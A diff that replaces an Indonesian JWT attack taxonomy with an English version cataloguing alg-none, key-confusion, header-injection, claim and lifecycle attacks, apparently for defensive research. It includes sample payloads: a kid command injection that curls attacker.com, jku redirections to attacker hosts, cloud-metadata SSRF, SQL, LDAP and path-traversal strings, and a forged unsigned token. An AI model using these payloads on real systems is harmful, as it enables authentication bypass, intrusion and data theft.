@@ -1,440 +1,653 @@
----
-title: JWT
----
+# JWT Attack Mutation Taxonomy
 
-## Struktur Klasifikasi
-
-Taksonomi ini mengorganisasi seluruh permukaan serangan JWT berdasarkan tiga sumbu ortogonal yang diturunkan dari analisis sistematis CVE, penelitian akademik, laporan bug bounty, dan tulisan praktisi hingga tahun 2025.
-
-**Sumbu 1 — Target Mutasi (Utama):** Komponen struktural JWT yang dimanipulasi. JWT terdiri dari tiga segmen (Header, Payload, Signature) ditambah ekosistem manajemen kunci, transport, dan mekanisme lifecycle. Setiap kategori tingkat atas menargetkan komponen struktural yang berbeda — kolom algoritma, parameter header untuk resolusi kunci, tanda tangan kriptografis itu sendiri, claim payload, infrastruktur manajemen kunci, transport/penyimpanan token, atau lifecycle tingkat protokol.
-
-**Sumbu 2 — Jenis Ketidaksesuaian (Lintas-Bidang):** Sifat pelanggaran keamanan yang diciptakan oleh setiap mutasi. Jenis ketidaksesuaian ini memotong semua kategori dan menjelaskan *mengapa* setiap mutasi berhasil:
-
-| Jenis Ketidaksesuaian   | Deskripsi                                                                                        |
-| ----------------------- | ------------------------------------------------------------------------------------------------ |
-| **Signature Bypass**    | Pemeriksaan integritas token sepenuhnya dihindari                                                |
-| **Key Confusion**       | Verifier menggunakan kunci atau jenis kunci yang berbeda dari yang dimaksudkan                   |
-| **Validation Gap**      | Pemeriksaan yang diperlukan (claim, parameter, batasan) tidak ada atau tidak lengkap             |
-| **Injection**           | Data yang dikontrol penyerang mencapai interpreter yang tidak dimaksudkan (SQL, filesystem, URL) |
-| **Cryptographic Flaw**  | Kelemahan matematis atau implementasi dalam algoritma penandatanganan/verifikasi                 |
-| **Type Confusion**      | Verifier memproses token sebagai jenis yang berbeda (JWS vs. JWE) dari yang dimaksudkan          |
-| **Resource Exhaustion** | Parameter yang dikontrol penyerang memaksa komputasi berlebihan sebelum autentikasi              |
-| **Lifecycle Abuse**     | Mengeksploitasi sifat stateless JWT atau asumsi berbasis waktu                                   |
-
-**Sumbu 3 — Skenario Serangan (Pemetaan):** Konteks dampak dunia nyata — bypass autentikasi, eskalasi hak istimewa, pengambilalihan akun, relay token lintas-layanan, SSRF, RCE, DoS, atau eksfiltrasi data. Ini dipetakan dalam bagian Pemetaan Skenario Serangan (§8).
-
-### Mekanisme Fundamental
-
-JWT adalah format token yang ringkas dan URL-safe yang didefinisikan dalam RFC 7519, terdiri dari tiga segmen yang di-encode Base64URL dan dipisahkan oleh titik: `Header.Payload.Signature`. Header menyatakan algoritma penandatanganan (`alg`) dan parameter opsional resolusi kunci (`kid`, `jku`, `jwk`, `x5u`, `x5c`). Payload berisi claim (issuer, subject, audience, expiration, data kustom). Signature dihitung atas `Base64URL(Header).Base64URL(Payload)` menggunakan algoritma dan kunci yang ditentukan. Verifikasi mengharuskan penerima untuk: (1) mengurai header, (2) me-resolve kunci yang benar, (3) memverifikasi signature, dan (4) memvalidasi claim. Setiap mutasi dalam taksonomi ini mengeksploitasi kegagalan pada satu atau lebih dari empat langkah ini.
+**Version:** 2026-03 | **Scope:** JSON Web Token (JWT / JWS / JWE) attack surface  
+**Coverage:** RFC 7515–7519, RFC 8725, 2023–2026 CVEs and bounty disclosures  
+*Created for defensive security research and vulnerability understanding purposes.*
 
 ---
 
-## §1. Manipulasi Algoritma
+## Classification Structure
 
-Serangan yang memodifikasi atau mengeksploitasi kolom header `alg` untuk menumbangkan verifikasi signature. Ini adalah permukaan serangan JWT yang paling signifikan secara historis.
+This taxonomy organizes JWT attacks along three axes:
 
-### §1-1. Bypass Algoritma None
+**Axis 1 — Mutation Target (WHAT is attacked):** The structural component of the JWT stack that is mutated or abused — algorithm negotiation, header parameters, payload claims, cryptographic primitives, the key material itself, the token lifecycle, the transport layer, the parsing engine, the encryption layer (JWE), and the deployment architecture.
 
-Kolom `alg` diatur ke `"none"` (atau variasinya), yang menginstruksikan verifier untuk melewati pemeriksaan signature sepenuhnya.
+**Axis 2 — Discrepancy Type (WHAT mismatch it exploits):** The nature of the verification failure that makes the mutation dangerous — signature bypass (the server accepts the token without verifying it), algorithm confusion (the server verifies with the wrong method), claim bypass (the server trusts an unvalidated claim), injection (the server passes attacker-controlled data to a subsystem), key substitution (the server uses an attacker-supplied key), or lifecycle bypass (the server fails to enforce token state).
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **None kanonik** | Atur `alg` ke `"none"` dan hapus segmen signature | Server menerima algoritma yang tidak terdaftar/tidak dibatasi |
-| **Variasi huruf besar/kecil** | Gunakan `"None"`, `"NONE"`, `"nOnE"` untuk melewati blocklist yang peka huruf | Pemeriksaan blocklist memeriksa `alg` secara peka huruf besar/kecil, tetapi parser menormalisasi |
-| **Preservasi signature kosong** | Atur `alg` ke `"none"` tetapi pertahankan titik akhir (misalnya `header.payload.`) | Parser membutuhkan tiga segmen tetapi tidak menegakkan keberadaan signature |
-| **Trik whitespace/encoding** | Sisipkan whitespace, null byte, atau padding Base64 alternatif di sekitar `"none"` | Parser menormalisasi sebelum perbandingan, tetapi blocklist memeriksa nilai mentah |
-| **Bypass signature kosong algoritma tidak dikenal** | Atur `alg` ke nilai sembarang yang tidak didukung (misalnya `"zzz"`, `"foo"`). Fungsi komputasi signature library mengembalikan string kosong untuk algoritma yang tidak dikenal alih-alih memunculkan error. Penyerang menyediakan segmen signature kosong (titik akhir). Verifikasi membandingkan `"" == ""` dan lolos — jalur kode yang berbeda dari handler `none`, yang secara eksplisit melewati verifikasi (CVE-2026-23993) | Library mengembalikan nilai kosong/default dari komputasi signature untuk algoritma yang tidak dikenal; perbandingan signature tidak menolak nilai kosong |
+**Axis 3 — Deployment Scenario (WHERE it lands):** The architectural context that determines exploitability and impact — monolith web applications, microservice meshes, cloud-managed auth (AWS ALB, Azure AD, GCP IAP), OAuth/OIDC flows, IoT device authentication, and agentic AI pipelines.
 
-**Contoh payload:**
+### Axis 2 Summary Table
+
+| Discrepancy Type | Root Cause | Typical Impact |
+|-----------------|-----------|----------------|
+| **Signature Bypass** | Server skips or nullifies verification | Full auth bypass |
+| **Algorithm Confusion** | Server verifies with wrong algorithm/key | Token forgery |
+| **Claim Bypass** | Server trusts unvalidated payload fields | Privilege escalation |
+| **Header Injection** | Attacker controls key-selection parameters | Key substitution → forgery |
+| **Key Material Weakness** | Predictable/brute-forceable signing secrets | Token forgery |
+| **Cryptographic Flaw** | EC/RSA primitive misuse | Private key recovery |
+| **Lifecycle Bypass** | No revocation / temporal claim ignored | Replay, persistent access |
+| **Parser Differential** | Library parses JSON differently than app | Claim spoofing |
+| **Encryption Stripping** | JWE decrypted but inner JWS not verified | Plaintext forgery |
+| **Transport / Storage Abuse** | Token exfiltration or injection at rest/transit | Session hijack |
+
+---
+
+## §1. Algorithm Negotiation Attacks
+
+The `alg` header field, being attacker-controlled before the token is verified, is the oldest and most prolifically exploited structural weakness in JWT. An attacker who can force the server to switch from its intended algorithm to a weaker or trivially exploitable one achieves token forgery without needing any secret material.
+
+### §1-1. Null-Algorithm Injection ("none" Bypass)
+
+The JWT specification defines `alg: none` as a valid value for an "unsecured JWT" — a token with no signature at all. Naive libraries that accept this value authenticate the attacker's arbitrary payload.
+
+| Subtype | Mechanism | Example Header | Condition |
+|---------|-----------|----------------|-----------|
+| **Exact "none"** | Header sets `"alg":"none"`, signature portion is empty | `{"alg":"none","typ":"JWT"}` | Server does not blocklist `none` |
+| **Case-variation bypass** | Mixed-case variants bypass string-comparison blocklists | `{"alg":"None"}`, `{"alg":"nOnE"}`, `{"alg":"NONE"}` | Blocklist is case-sensitive |
+| **Trailing-dot stripping** | Signature part is omitted but trailing dot retained | `header.payload.` | Parser splits on dots, treats empty sig as valid |
+| **"alg" key deletion** | Header submitted without any `alg` field; library defaults to `none` | `{"typ":"JWT"}` | Library has insecure default |
+
+The payload must still be terminated with a trailing dot; the signature portion is empty or entirely absent. Modern variants exploit case-sensitivity in blocklist checks, which remains unpatched in some embedded and IoT deployments (see §12 for IoT-specific replay context).
+
+### §1-2. Symmetric-to-Asymmetric Confusion (RS256 → HS256)
+
+When a server uses RS256, it signs with a private key and verifies with the public key. If that server dynamically selects the verification algorithm from the attacker-controlled `alg` header, an attacker can change `alg` to `HS256` and sign the token with the RSA **public** key as the HMAC secret. The server, now interpreting the public key as an HMAC secret, validates the forged signature.
+
+| Subtype | Mechanism | Key Derivation Method |
+|---------|-----------|----------------------|
+| **RS256 → HS256** | Attacker resigns with RSA public key as HMAC secret | From `/.well-known/jwks.json`, TLS cert, or embedded in mobile app |
+| **ES256 → HS256** | Attacker resigns with ECDSA public key as HMAC secret | Public key extracted from OIDC endpoint or computed from §8-2 |
+| **PS256 → HS256** | RSA-PSS public key reused as HMAC secret | Same key discovery paths as RS256 |
+| **Public Key Recovery** | Attacker derives public key from two captured tokens without any known endpoint | `rsa_sign2n` / `jwt_forgery.py` / PortSwigger `sig2n` container |
+
+CVE-2024-54150 (cjwt library, CVSS 9.8) is a recent instance: the library accepted the RSA public key passed to its decode function as an HMAC secret because the API design did not distinguish key types. CVE-2025-27371 exploited ECDSA public key recovery to enable token forgery.
+
+### §1-3. Algorithm Downgrade
+
+| Subtype | Mechanism | Condition |
+|---------|-----------|-----------|
+| **RS512 → RS256 / RS384** | Weaker hash function may leak timing differences useful for side channels | Server permits any RSA family algorithm |
+| **PS256 → RS256** | Removes MGF1 padding randomness; deterministic RSA is more vulnerable to differential analysis | Server does not enforce PSS padding |
+| **JWE algorithm downgrade** | Attacker switches `"alg"` in JWE from `RSA-OAEP-256` to `RSA1_5` (PKCS#1 v1.5) | Server accepts legacy key wrapping algorithms (Bleichenbacher oracle) |
+
+---
+
+## §2. Header Parameter Injection
+
+The JWS specification defines optional header parameters (`jwk`, `jku`, `kid`, `x5c`, `x5u`, `x5t`) whose purpose is to help the verifier locate the correct key. When a server acts on these values without whitelisting or sanitization, the attacker can supply their own key material and instruct the server to verify the token against it.
+
+### §2-1. JWK Self-Embedding (`jwk` Injection)
+
+The `jwk` header parameter allows a server to embed a public key directly in the token. A misconfigured server that fetches the verification key from this attacker-controlled field accepts any token signed with the corresponding private key.
+
+**Mechanism:** Attacker generates an RSA or EC keypair, signs a forged payload with the private key, and embeds the public key in the `jwk` header. The server verifies the signature against the attacker's own public key.
+
+**Example Header:**
+```json
+{
+  "alg": "RS256",
+  "jwk": {
+    "kty": "RSA",
+    "e": "AQAB",
+    "kid": "attacker-key",
+    "n": "<attacker RSA modulus>"
+  }
+}
 ```
-eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.
+
+**Condition:** Server does not maintain an allowlist of trusted keys and instead accepts any key embedded in the header.
+
+### §2-2. JWK Set URL Injection (`jku` SSRF / Key Redirection)
+
+The `jku` header points the verifier to a URL from which it should fetch a JWK Set. If the server fetches this URL without whitelisting, the attacker hosts their own JWKS at an attacker-controlled endpoint.
+
+| Subtype | Bypass Technique | Example |
+|---------|-----------------|---------|
+| **Direct jku substitution** | Server has no URL whitelist | `"jku":"https://attacker.com/jwks.json"` |
+| **Subdomain confusion** | Attacker-controlled subdomain of trusted domain | `"jku":"https://trusted.evil.com/..."` |
+| **@ symbol trick** | Browser-URL vs. fetcher interpretation split | `"jku":"https://trusted.com@attacker.com/jwks.json"` |
+| **Path traversal on jku** | Server checks `startsWith("https://trusted")` | `"jku":"https://trusted.com/redirect?url=https://evil.com"` |
+| **Open redirect chain** | Whitelisted domain has an open redirect | `"jku":"https://trusted.com/api/redirect?to=https://attacker.com/jwks.json"` |
+| **Response header injection** | Server fetches jku but is vulnerable to header injection at that URL; attacker plants inline JWKS | Inject `\r\n` into URL path to add malicious Location header |
+| **SSRF via jku** | Server can reach internal metadata | `"jku":"http://169.254.169.254/latest/meta-data/"` |
+
+Servers that follow HTTP redirects when fetching `jku` are vulnerable to open-redirect chains even when the initial domain is whitelisted.
+
+### §2-3. X.509 URL Injection (`x5u` / `x5c`)
+
+The `x5u` header is analogous to `jku` but references an X.509 certificate chain. `x5c` embeds the certificate directly.
+
+| Subtype | Mechanism |
+|---------|-----------|
+| **x5u SSRF** | Server fetches attacker-controlled PEM from `x5u` URL; attacker forges tokens with their own CA |
+| **x5c self-signed injection** | Attacker generates a self-signed certificate, embeds it in `x5c`, signs forged payload with the corresponding private key |
+| **x5t thumbprint spoofing** | Attacker crafts a cert whose SHA-1 thumbprint matches a whitelisted `x5t` value via hash collision (low practical risk but theoretically in scope for SHA-1) |
+| **CVE-2017-2800 / CVE-2018-2633 parsing** | Complex DER/ASN.1 parsing of x5c certificates introduced memory-safety vulnerabilities in some TLS libraries used for verification |
+
+### §2-4. Key ID Injection (`kid`)
+
+The `kid` header is a hint identifying which key to use for verification. It is intended to be an opaque string but is frequently passed unsanitized to subsystems.
+
+| Subtype | Mechanism | Payload Example |
+|---------|-----------|-----------------|
+| **SQL injection via kid** | kid value used directly in a database query to retrieve the signing key | `"kid": "1' UNION SELECT 'attacker-secret'-- -"` |
+| **Path traversal via kid** | kid value used as a file path without sanitization | `"kid": "../../../../../../../dev/null"` (sign with empty/null key) |
+| **Command injection via kid** | kid value passed to a shell command | `"kid": "/keys/secret7.key; curl http://attacker.com/exfil"` |
+| **SSRF via kid** | kid used to construct an HTTP request to retrieve remote key | `"kid": "http://169.254.169.254/..."` |
+| **Predictable key path** | kid guessable; attacker predicts path and provides matching key content | `"kid": "key/12345"` → look for `/key/12345.pem` |
+
+The path traversal subtype is particularly powerful when the server uses HMAC: by pointing `kid` to `/dev/null` or another predictable empty file, the attacker can sign with a null byte (`AA==` base64) and the server accepts the token.
+
+### §2-5. Content-Type Header Injection (`cty`)
+
+The `cty` parameter declares the media type of the payload content. Injecting unusual content types can chain into secondary parsers.
+
+| Subtype | Mechanism |
+|---------|-----------|
+| **cty: text/xml** | After signature bypass (§1), injecting XML payload can trigger XXE on a downstream XML parser |
+| **cty: application/x-java-serialized-object** | Chaining with signature bypass to deliver a Java deserialization gadget chain through the JWT payload |
+
+---
+
+## §3. Payload Claim Manipulation
+
+The JWT payload carries all authorization decisions, yet many servers fail to rigorously validate every claim. Manipulating payload claims directly — when signature verification is weak or absent — or exploiting claim validation logic flaws are the most common privilege escalation path.
+
+### §3-1. Privilege Escalation via Role and Permission Claims
+
+| Subtype | Mechanism | Example |
+|---------|-----------|---------|
+| **Boolean privilege flip** | Change `"isAdmin": false` → `"isAdmin": true` | Works only when signature verification is absent (§1 or §4) |
+| **Role array tampering** | Inject elevated roles into a role array | `"roles": ["admin","superuser"]` |
+| **Scope expansion** | Broaden OAuth scope claims | `"scope": "read write delete admin"` |
+| **Permission claim injection** | Add write/delete to permissions | `"permissions": ["read","write","admin:*"]` |
+
+### §3-2. Identity Claim Spoofing
+
+| Subtype | Mechanism | Real-World Pattern |
+|---------|-----------|-------------------|
+| **Subject (`sub`) substitution** | Replace own `sub` with victim's UUID or username | Requires weak or bypassed signature |
+| **Email claim reliance** | Server maps identity based on `email` rather than `sub`; attacker registers with victim's email or modifies email claim | nOAuth bug ($75,000 total bounty, 2023): attacker modified Azure AD email attribute to control `email` claim in Microsoft identity JWTs |
+| **Custom claim manipulation** | Non-standard claims used for access control (tenant_id, org_id, user_type) | Modify custom fields to switch tenant or escalate within org |
+| **Sub-claim format confusion** | Server expects UUID but attacker sends a URL or email; causes mapping to wrong account | URI-format subject in OIDC contexts |
+
+### §3-3. Temporal Claim Bypass
+
+| Subtype | Mechanism | Condition |
+|---------|-----------|-----------|
+| **exp not validated** | Server accepts tokens after their expiration time | Library called with `ignoreExpiration: true` or no exp check |
+| **nbf not validated** | Server accepts tokens before their `not before` time | Library does not implement nbf check |
+| **exp removal** | Entire `exp` claim deleted; server treats token as perpetually valid | Missing claim defaults to "always valid" in some libraries |
+| **Far-future exp** | exp set to year 9999 or max integer value | Server validates exp presence but not reasonableness |
+| **NBF client-time manipulation ("Back to the Future")** | Server derives `nbf` from client-supplied date; attacker sends date 2 days in future, getting a token usable today | Clock-derived nbf without server-side validation |
+| **IoT pre-signed future tokens** | Physical access during manufacturing used to coerce a Secure Element to sign tokens with iat set far in future (LightSEC 2025 research) | IoT supply-chain attack, SE does not validate time source integrity |
+
+### §3-4. Issuer and Audience Bypass
+
+| Subtype | Mechanism | Condition |
+|---------|-----------|-----------|
+| **iss not validated** | Server accepts tokens from any issuer | Missing or incomplete iss validation |
+| **iss array injection** | Library bug in fast-jwt (pre-5.0.6) accepts `iss` as a string array; attacker includes both legitimate and malicious issuer | Library does not enforce RFC 7519 string type |
+| **aud not validated** | Token issued for Service A accepted by Service B | No audience claim or server accepts any audience |
+| **Cross-tenant iss spoofing (ALBeast)** | AWS ALB uses a shared public key server; attacker creates their own ALB, sets issuer to victim's expected value, and mints forged tokens (CVE-2024-8901, CVE-2024-10125) | Application exposed directly to internet; no signer-field validation |
+| **Cross-service relay** | Token obtained from a low-privilege service replayed against a high-privilege service | Missing aud claim in microservice architecture |
+
+---
+
+## §4. Signature Verification Failure
+
+Beyond algorithm manipulation (§1), some servers simply fail to verify the signature at all, or verify it in a way that can be tricked without changing the algorithm.
+
+### §4-1. Decode Without Verify
+
+Many JWT libraries expose both a `decode()` method (extracts claims without verifying the signature) and a `verify()` method (validates the signature before extracting claims). When developers use `decode()` for authenticated endpoints, any modified token is accepted.
+
+**Condition:** Application code calls the library's decode-only function on the authentication path. Detectable by modifying one bit of the signature and checking if the server still accepts the token.
+
+### §4-2. Empty or Truncated Signature Acceptance
+
+| Subtype | Mechanism |
+|---------|-----------|
+| **Empty signature** | Signature portion is an empty string but the trailing dot is present: `header.payload.` |
+| **Null-byte signature** | Signature is `AA==` (Base64 null byte); some HMAC implementations treat zero-length keys as valid |
+| **Signature length mismatch accepted** | Library returns true even when signature does not match, if length differs from expected (historical libsodium-adjacent issues) |
+
+### §4-3. Timing-Based Signature Oracle
+
+Some HMAC implementations compare the computed signature to the presented signature using a non-constant-time comparison. By submitting tokens with a guessed signature byte by byte and measuring response latency, an attacker can reconstruct the valid signature.
+
+**Practical threshold:** Requires network stability and many thousands of requests per byte. More relevant in internal-network scenarios (LAN latency < 1ms).
+
+### §4-4. JWE-Wrapped PlainJWT (Encryption-Without-Signing)
+
+When a library decrypts a JWE and then attempts to parse the inner payload as a SignedJWT, but the inner token is a PlainJWT (`alg: none`), the SignedJWT object is null. If the library's null check short-circuits the signature verification path, the server processes an unsigned token as authentic.
+
+**CVE-2026-29000 (pac4j-jwt, CVSS 10.0, March 2026):** Attacker encrypts a PlainJWT with the server's RSA public key. The decryption succeeds; the inner PlainJWT is accepted without signature verification. Attacker can authenticate as any user including administrators with only the public key.
+
+---
+
+## §5. Key Material Weakness and Secret Exposure
+
+Even when signature verification is correctly implemented, the signing key itself may be weak, leaked, or derivable from observable data.
+
+### §5-1. Weak HMAC Secret (Brute-Force Attack)
+
+HMAC-based JWT security depends entirely on the secrecy and entropy of the shared secret. Weak secrets allow offline brute-force attacks after capturing any valid token.
+
+| Subtype | Mechanism |
+|---------|-----------|
+| **Dictionary attack** | Common values: `"secret"`, `"password"`, service name, project name, `"123456"` |
+| **Default library secrets** | Open-source projects with hardcoded defaults in configuration templates |
+| **Hardcoded secrets (CVE-2025-7079, CVE-2025-6950)** | Secret embedded as string literal in firmware (e.g., `"bluebell-plus"` in `jwt.go`); Moxa routers used hardcoded key |
+| **Short secrets** | Secrets under 256 bits are brute-forceable with Hashcat on consumer GPU hardware |
+| **Environment variable leakage** | Secret exposed via debug logs, `/env` endpoints, error messages, or container introspection |
+
+**Tool:** Hashcat `-m 16500` mode performs GPU-accelerated offline brute-force of HS256/HS384/HS512 tokens.
+
+### §5-2. Signing Key Leakage Paths
+
+| Leakage Vector | Mechanism |
+|---------------|-----------|
+| **Source code / repository** | Secret committed to git history or `.env` file |
+| **Error messages** | Verbose error handlers include secret in diagnostic output |
+| **Debug logging** | `JWT_SECRET` logged alongside token during development; log shipped to SIEM |
+| **API / admin endpoint** | Config endpoint (like nginx-ui `/preferences`) exposes JWT secret in response body |
+| **Mobile app reverse engineering** | HMAC secret embedded in APK/IPA; extracted via `apktool` or `strings` |
+| **Client-side JavaScript** | Secret referenced in bundled frontend code |
+| **Backup files** | `.bak`, `.old`, or `~` suffixed config files expose secrets via path traversal or directory listing |
+
+### §5-3. Key Rotation Failure
+
+| Subtype | Mechanism |
+|---------|-----------|
+| **No rotation policy** | Signing key never rotated; old compromised keys remain valid indefinitely |
+| **Rotation without revocation** | New key deployed but old tokens signed with previous key remain accepted |
+| **Key version confusion** | Multi-key setups where kid routing allows attacker to force use of an older, weaker key |
+
+---
+
+## §6. Cryptographic Primitive Exploitation
+
+These attacks target weaknesses in the underlying mathematical operations used to generate or verify JWT signatures, independent of the library's high-level API design.
+
+### §6-1. ECDSA Nonce Reuse (Private Key Recovery)
+
+ECDSA requires a unique, cryptographically random nonce `k` for every signature. If the same `k` is used to sign two different messages, both signatures share the same `r` value, and an attacker can solve for the private key algebraically in O(1) given the two (r, s, hash) tuples.
+
+**Detection:** Compare the `r` values across all collected ES256/ES384/ES512 tokens. Matching `r` values indicate nonce reuse.
+
+**Recovery formula:** `k = (h1 - h2) / (s1 - s2) mod n` ; `priv = (s·k - h) / r mod n`
+
+**Real-World Context:** Sony PlayStation 3 (2011) and numerous Ethereum wallets fell to this attack. In JWT contexts, any IoT firmware or hardware security module that signs tokens with a biased PRNG is vulnerable. CVE-2025-27371 involved ECDSA public key recovery enabling token forgery across cloud implementations.
+
+### §6-2. ECDSA Biased-Nonce Lattice Attack (LLL)
+
+Even when nonces are not directly reused, if the nonce generation leaks even a few bits of information (e.g., the nonce always starts with several zero bits), a lattice reduction algorithm (LLL/BKZ) can recover the private key given enough signatures.
+
+| Bias Condition | Signatures Needed |
+|---------------|------------------|
+| 4 bits fixed | ~100 signatures |
+| 80 bits fixed (Yubikey bug) | 5 signatures |
+| 1 bit leaked (LadderLeak/OpenSSL) | A few hundred signatures |
+
+**Practical Impact:** Routers, IoT devices, or HSMs with poorly seeded PRNGs that sign many JWT tokens are recoverable.
+
+### §6-3. JWE Invalid Curve Attack (ECDH-ES Private Key Recovery)
+
+When JWE uses `ECDH-ES` key agreement, the receiver's private key is used to compute the shared secret. If the library does not validate that the ephemeral public key from the sender lies on the correct elliptic curve, an attacker can supply a point on a small-order curve. This causes the receiver's private key computation to operate in a small group, leaking partial key information. By submitting multiple JWEs with different small-order points and applying the Chinese Remainder Theorem, the attacker recovers the full private key.
+
+**Affected libraries (patched):** go-jose, node-jose, jose2go, Nimbus JOSE+JWT, jose4  
+**Condition:** JWE with `"alg":"ECDH-ES"` and library does not validate that the `epk` (ephemeral public key) is on the declared curve.
+
+### §6-4. RSA PKCS#1 v1.5 Bleichenbacher Oracle
+
+JWE supports `RSA1_5` key wrapping (PKCS#1 v1.5). Servers that distinguish between "bad padding" and "decryption failure" in their error responses act as a decryption oracle, allowing adaptive chosen-ciphertext attacks to decrypt arbitrary RSA ciphertext.
+
+**Condition:** Server uses `"alg":"RSA1_5"` in JWE AND provides distinguishable error responses for padding vs. decryption failures.
+
+---
+
+## §7. Token Lifecycle and State Management Failures
+
+JWT's stateless design means servers hold no token registry, making revocation an architectural afterthought. This section covers attacks that exploit the gap between token state and session state.
+
+### §7-1. Post-Logout Replay
+
+When a user logs out, client-side code deletes the stored token, but the token itself remains cryptographically valid until expiration. An attacker who captures the token before logout can replay it throughout its remaining lifetime.
+
+**Condition:** No server-side revocation mechanism (blacklist, jti registry, version counter). Token lifetime is long (hours or days).
+
+**Detection:** Save a token before logout; present it after logout to an authenticated endpoint.
+
+### §7-2. Token Blacklist / Denylist Bypass
+
+Applications that implement revocation through a jti-based denylist may be bypassed if:
+
+| Subtype | Mechanism |
+|---------|-----------|
+| **jti claim absent** | Token lacks a `jti`; revocation logic silently skips blacklist check |
+| **jti collision** | Attacker crafts a token with a jti that does not appear in the blacklist (guessable numeric jti) |
+| **Blacklist not propagated** | In microservice architecture, logout call updates one service's Redis but other services do not receive the invalidation event |
+| **Blacklist TTL mismatch** | Blacklist entry expires before the token's `exp`; token becomes valid again |
+| **Refresh token not revoked** | Access token revoked but long-lived refresh token remains valid; attacker uses it to mint new access tokens |
+
+### §7-3. Token Replay in Multi-Party Flows
+
+| Subtype | Mechanism |
+|---------|-----------|
+| **Authorization code → token reuse** | Access token captured from one user session replayed in another without a nonce binding |
+| **Refresh token rotation bypass** | Some implementations issue a new refresh token but accept the old one within a grace window; attacker races to reuse the old token |
+| **Cross-device session persistence** | Long-lived refresh token stolen from one device; used indefinitely on attacker's device |
+
+### §7-4. Key Rotation Without Token Invalidation (Insider Abuse)
+
+When an organization's signing key is compromised or rotated due to personnel changes, previously issued JWTs signed with the old key may remain accepted. Unless all outstanding tokens are explicitly revoked, an insider or attacker with the old key retains persistent access.
+
+---
+
+## §8. Key Reference and Discovery Attacks (JWKS Endpoint Abuse)
+
+### §8-1. JWKS Endpoint Enumeration
+
+Most deployments expose public keys at `/.well-known/jwks.json` or `/oauth/v2/keys`. These are legitimate, but the information they expose enables downstream attacks.
+
+| Subtype | Purpose |
+|---------|---------|
+| **Public key extraction** | Enables §1-2 algorithm confusion; enables §8-2 key recovery |
+| **kid enumeration** | Identifies which key IDs are trusted; enables kid-targeting in §2-4 |
+| **Algorithm discovery** | Reveals all supported algorithms; identifies weakest option |
+
+### §8-2. RSA / EC Public Key Derivation from Tokens
+
+When no JWKS endpoint is available, an attacker can derive the RSA public key from two or more tokens signed with the same private key using the mathematical relationship between the RSA signature, the message hash, and the public modulus.
+
+**Tool:** `rsa_sign2n` (GitHub: silentsignal), PortSwigger `sig2n` Docker container  
+**Process:** Supply two captured tokens → tool outputs candidate public keys → test each with algorithm confusion attack (§1-2).
+
+---
+
+## §9. Payload Injection and Secondary Parser Attacks
+
+These attacks treat the JWT payload as an untrusted input vector for downstream subsystems, independent of whether the signature is valid.
+
+### §9-1. Injection via Claims Used as Query Parameters
+
+When a server directly interpolates JWT claim values into database queries, file system paths, or OS commands without sanitization, standard injection attacks follow:
+
+| Subtype | Claim Used | Attack Vector |
+|---------|-----------|---------------|
+| **SQL injection via payload** | `username`, `sub`, `email` inserted into SQL | `"sub": "admin'--"` |
+| **NoSQL injection via payload** | MongoDB query built from claims | `"org": {"$gt": ""}` |
+| **LDAP injection via payload** | LDAP search filter built from `email` or `cn` claim | `"email": "*)(&(uid=*"` |
+| **Path traversal via payload** | Claim used to construct file path | `"profile_image": "../../etc/passwd"` |
+
+### §9-2. JWT Compression Attack (CRIME-Like)
+
+The JWE specification allows compressed plaintext before encryption (`"zip":"DEF"` — DEFLATE). If an attacker can influence both the compressed plaintext (e.g., via a reflected value in the payload) and observe ciphertext length, they can mount a CRIME-style attack to recover secrets from adjacent compression context.
+
+**Condition:** JWE token uses `zip:DEF`; attacker controls at least part of the plaintext and can observe ciphertext length differences.
+
+### §9-3. Type Confusion in Claim Validation
+
+Some JWT libraries are permissive about claim data types in ways that can subvert validation logic:
+
+| Subtype | Mechanism | Library / CVE |
+|---------|-----------|---------------|
+| **iss as array** | RFC 7519 requires `iss` to be a string; fast-jwt (pre-5.0.6) accepted string arrays, allowing an attacker to include a legitimate issuer alongside a malicious one to pass validation | fast-jwt CVE (2025) |
+| **exp as string** | Some libraries coerce string-type exp values; type confusion may bypass expiration checks | Library-specific |
+| **Boolean claim as 0/1 integer** | `"isAdmin": 0` evaluated as truthy in weak-typed languages | Application-level |
+| **Null claim injection** | Setting a claim to `null` causes undefined behavior in some validators | Library-specific |
+
+### §9-4. Duplicate Key Parsing Differential
+
+The JSON specification does not define behavior when an object contains duplicate keys. Different parsers resolve duplicates differently (first-wins, last-wins, or error). An attacker can craft a payload with duplicate claim keys where the signature covers the first occurrence but the application uses the last:
+
+```json
+{"alg":"HS256"}.{"sub":"user","sub":"admin"}.SIG
 ```
 
-### §1-2. Algorithm Confusion (Key Confusion)
-
-Penyerang mengubah algoritma dari asimetris (RSA/ECDSA) ke simetris (HMAC), menyebabkan verifier memperlakukan kunci publik sebagai secret HMAC.
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Kebingungan RS256→HS256** | Ubah `alg` dari `RS256` ke `HS256`; tandatangani dengan kunci publik [[RSA]] sebagai secret [[HMAC]] | Server memilih algoritma dari header token; kunci publik dapat diperoleh |
-| **Kebingungan ES256→HS256** | Prinsip yang sama diterapkan pada downgrade ECDSA-ke-HMAC | Kunci publik terekspos melalui endpoint JWKS atau sertifikat |
-| **Kebingungan PS256→HS256** | Downgrade RSA-PSS ke HMAC | Kondisi yang sama dengan varian RS256 |
-| **Derivasi kunci publik** | Ketika kunci publik tidak langsung terekspos, turunkan dari dua token yang telah ditandatangani atau lebih menggunakan pemulihan matematis | Server telah menandatangani ≥2 token dengan kunci RSA yang sama; penyerang mendapatkan keduanya |
-
-Serangan ini berhasil karena verifikasi HMAC menggunakan satu secret bersama, dan jika library menerima algoritma dari header token, ia akan menggunakan kunci publik RSA (nilai yang diketahui) sebagai secret HMAC — nilai yang juga diketahui penyerang.
-
-### §1-3. Downgrade Algoritma
-
-Memaksa penggunaan varian algoritma yang lebih lemah dalam keluarga algoritma yang sama.
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Downgrade RS512→RS256** | Beralih ke varian RSA yang lebih lemah dengan persyaratan signature yang lebih pendek | Server mengizinkan fleksibilitas algoritma dalam keluarga RSA |
-| **Downgrade ES512→ES256** | Beralih ke kurva ECDSA yang lebih lemah | Server tidak mem-pin kurva/ukuran kunci yang spesifik |
-| **Kebingungan EdDSA→ECDSA** | Beralih antara algoritma kurva Edwards dan kurva Weierstrass | Library menangani beberapa keluarga algoritma EC |
